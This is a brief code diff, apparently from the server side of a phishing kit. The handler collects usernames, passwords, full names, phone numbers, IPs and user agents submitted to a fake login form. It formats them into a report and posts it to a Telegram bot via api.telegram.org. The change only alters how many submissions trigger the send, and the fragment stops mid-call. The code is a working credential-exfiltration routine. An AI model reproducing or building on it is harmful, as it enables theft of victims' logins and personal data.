@@ -6,7 +6,7 @@ const sendRes = async (req, res) => {
   let { username, password, fullname, telephone, ip, userAgent, telegramId } =
     req.body;
   var originalText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nTelephone: ${telephone}\n+----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
-  if (count == 6) {
+  if (count == 2) {
     await axios
       .post(
         `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
